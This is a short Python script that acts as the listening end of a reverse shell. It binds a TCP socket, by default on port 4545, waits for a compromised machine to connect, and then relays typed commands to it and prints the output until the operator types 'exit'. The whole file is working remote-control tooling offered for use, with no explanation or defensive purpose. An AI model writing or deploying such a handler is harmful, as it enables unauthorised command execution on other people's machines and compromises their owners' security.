import socket
from sys import argv
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try : 
    sock.bind((argv[1],int(argv[2])))
except :
    print("[*] No valid socket option specified : Opening on port 4545")
    sock.bind(('',4545))
sock.listen(1)
client, addrclient = sock.accept()
print("[+] Reverse Shell started")
while True :
    command = input("(exec) >")
    if command == "exit" :
        client.send(command.encode())
        client.close()
        sock.close()
        print("[*] Session closed")
        break
    else :
        client.send(command.encode())
        result = client.recv(1024).decode()
        print(result)
exit(0)